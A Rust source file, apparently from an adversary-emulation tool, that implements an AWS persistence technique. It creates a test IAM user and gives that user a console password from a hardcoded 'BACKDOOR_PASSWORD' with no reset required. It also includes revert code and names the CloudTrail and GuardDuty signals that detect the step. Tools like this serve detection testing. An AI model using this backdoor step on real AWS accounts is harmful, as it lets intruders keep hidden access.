use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
resource "aws_iam_user" "victim" {
  name          = "stratus-red-team-${random_string.suffix.result}"
  force_destroy = true
  tags = { StratusRedTeam = "true" }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

output "user_name" {
  value = aws_iam_user.victim.name
}
"#;

const BACKDOOR_PASSWORD: &str = "Str@tus!RedT3am#";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let user_name = outputs.get("user_name").ok_or_else(|| anyhow::anyhow!("Missing output: user_name"))?;

    aws.iam
        .create_login_profile()
        .user_name(user_name)
        .password(BACKDOOR_PASSWORD)
        .password_reset_required(false)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Created console login profile for user: {}", user_name);

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let user_name = outputs.get("user_name").ok_or_else(|| anyhow::anyhow!("Missing output: user_name"))?;

    let result = aws.iam
        .delete_login_profile()
        .user_name(user_name)
        .send()
        .await;

    match result {
        Err(e) => {
            let msg = format!("{}", e);
            if msg.contains("NoSuchEntity") || msg.contains("NotFound") || msg.contains("not found") {
                // ignore
            } else {
                return Err(anyhow::anyhow!("{}", e));
            }
        }
        Ok(_) => {
            println!("Deleted login profile for user: {}", user_name);
        }
    }

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.persistence.iam-create-user-login-profile",
        friendly_name: "Create IAM User Login Profile",
        description: "Creates a console login profile (password) for an existing IAM user that previously had no console access.",
        detection: "CloudTrail: CreateLoginProfile. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
